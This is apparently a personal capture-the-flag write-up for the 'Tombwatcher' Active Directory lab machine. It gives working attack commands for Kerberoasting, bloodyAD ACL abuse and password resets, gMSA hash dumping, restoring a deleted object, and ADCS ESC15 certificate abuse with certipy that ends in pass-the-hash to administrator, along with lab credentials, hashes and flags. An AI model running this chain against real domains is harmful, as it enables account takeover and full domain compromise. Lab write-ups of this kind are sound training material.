# Tombwatcher
- [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb)
- `tombwatcher.htb dc01 dc01.tombwatcher.htb`
- Creds:
    `henry:H3nry_987TGV!`
    `alfred:basketball`
    `sam`
    `john`
    `ansible_dev$:2669c6ff3a3d9c7472e358c7a792697b`

## NMAP
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-05 18:28:49Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2026-01-05T18:30:09+00:00; +3h59m54s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-05T18:30:09+00:00; +3h59m54s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-05T18:30:09+00:00; +3h59m54s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-05T18:30:09+00:00; +3h59m54s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Foothold
- 80 has an iis server
- vulnerable to tilde enum
    - `aspnet_client/system_web/4_0_30319/` found via shortscan + fuzzing but returns 403 forbidden
- no vhosts or directories found
- ran bloodhound as `henry` to get `WriteSPN` over alfred.
![alt text](/docs/blog/attachments/tombwatcher.png)

- `python3 targetedKerberoast.py -d tombwatcher.htb --dc-ip 10.129.54.117 -u 'henry' -p 'H3nry_987TGV!'`
    - cracked hash using `hashcat -m 13100`
    - `alfred:basketball`
- `alfred` has `AddSelf` to `Infrastructure group`
- `bloodyAD -d tombwatcher.htb --dc-ip 10.129.54.117 -u alfred -p 'basketball' add groupMember "INFRASTRUCTURE" 'alfred'`
    - confirm if `Added to Infrastructure`
    - `bloodyAD -d tombwatcher.htb --dc-ip 10.129.54.117 -u alfred -p 'basketball' get membership 'alfred'`
- running bloodhound as `alfred`
- we can dump nt hash of `ansible_dev` using gMSAdumper
    - `python3 gMSADumper.py -u alfred -p basketball -d tombwatcher.htb`
    - `ansible_dev:2669c6ff3a3d9c7472e358c7a792697b`
- confirmed creds with nxc
- `ansible_dev$` has force change password on `SAM`
- `bloodyAD -d tombwatcher.htb --dc-ip 10.129.54.117 -u 'ansible_dev$' -p :2669c6ff3a3d9c7472e358c7a792697b set password "sam" "Under1taker@123"`
    - changed password
- `sam` has `writeowner` on `John`
    - `bloodyAD -d tombwatcher.htb --dc-ip 10.129.54.117 -u sam -p 'Under1taker@123' set owner "john" "sam"`
        - Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john
    - # Now add yourself GenericAll permission on the object
    - `bloodyAD -d tombwatcher.htb --dc-ip 10.129.54.117 -u sam -p 'Under1taker@123' add GenericAll "john" "sam" `
    
    - # Then change the target user's password
    - `bloodyAD -d tombwatcher.htb --dc-ip 10.129.54.117 -u sam -p 'Under1taker@123' set password "john" "Under2taker@123"`
- `evil-winrm -i 10.129.54.117 -u john -p 'Under2taker@123'`
    - get user.txt - dfa9fc8def450e3c6d28cee7a15ae541

## PrivEsc
- `john` has `GenericAll` over ADCS
- `net localgroup` shows `Cert Publishers`
- `bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb -u JOHN -p 'Under2taker@123' add groupMember "Cert Publishers" "JOHN"`

- `Get-ADObject -Filter 'isDeleted -eq $true -and lastKnownParent -like "OU=ADCS,DC=TOMBWATCHER,DC=HTB"' -IncludeDeletedObjects -Properties * | Select-Object Name, ObjectGUID, lastKnownParent, sAMAccountName`
    - returns `cert_admin`
    ```
        Name                                                ObjectGUID                           lastKnownParent               sAMAccountName
    ----                                                ----------                           ---------------               --------------
    cert_admin...                                       f80369c8-96a2-4a7f-a56c-9c15edd7d1e3 OU=ADCS,DC=tombwatcher,DC=htb cert_admin
    cert_admin...                                       c1f1f0fe-df9c-494c-bf05-0679e181b358 OU=ADCS,DC=tombwatcher,DC=htb cert_admin
    cert_admin...                                       938182c3-bf0b-410a-9aaa-45c8e1a02ebf OU=ADCS,DC=tombwatcher,DC=htb cert_admin

    ```
- Restoring an AD Object (The command will work only once.)
    - `Restore-ADObject -Identity "f80369c8-96a2-4a7f-a56c-9c15edd7d1e3"`
    - `Restore-ADObject -Identity "c1f1f0fe-df9c-494c-bf05-0679e181b358"`
    - `Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"`
- Removing an AD object
    - `Remove-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"`
    - `bloodyAD -d tombwatcher.htb --dc-ip 10.129.54.117 -u john -p 'Under2taker@123' remove object "cert_admin"`

- Run bloodhound as john again
    - `john` as `GenericAll` over `cert_admin`
- `bloodyAD -d tombwatcher.htb --dc-ip 10.129.54.117 -u john -p 'Under2taker@123' set password "cert_admin" "Under3taker@123"`
- `bloodhound-python -u 'cert_admin' -p 'Under3taker@123' -ns 10.129.54.117 -d tombwatcher.htb -c all `
    - Nothing
- `certipy-ad find -vulnerable -dc-ip 10.129.54.117 -u 'cert_admin' -p 'Under3taker@123'`
    - `Vulnerable to ESC15`
- Exploiting ESC15
- Style 1 - **DID NOT WORK**
```
certipy-ad req \
    -u 'cert_admin@tombwatcher.htb' -p 'Under3taker@123' \
    -dc-ip '10.129.54.117' -target 'DC01.TOMBWATCHER.HTB' \
    -ca 'tombwatcher-CA-1' -template 'WebServer' \
    -upn 'administrator@tombwatcher.htb' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'

certipy-ad auth \
    -dc-ip '10.10.11.236' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'manager.htb'
```
- Style 2
```
certipy-ad req \
    -u 'cert_admin@corp.local' -p 'Under3taker@123' \
    -dc-ip '10.129.54.117' -target 'DC01.TOMBWATCHER.HTB' \
    -ca 'tombwatcher-CA-1' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'

certipy-ad req \
    -u 'cert_admin@corp.local' -p 'Under3taker@123' \
    -dc-ip '10.129.54.117' -target 'DC01.TOMBWATCHER.HTB' \
    -ca 'tombwatcher-CA-1' -template 'User' \
    -pfx 'cert_admin.pfx' -on-behalf-of 'Administrator'

certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.129.54.117'
```
- Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
- `evil-winrm -i 10.129.54.117 -u Administrator -H 'f61db423bebe3328d33af26741afe5fc'`
- get root.txt - c4c3e1aa2c6fe2b7ac080c77bdaad4a9
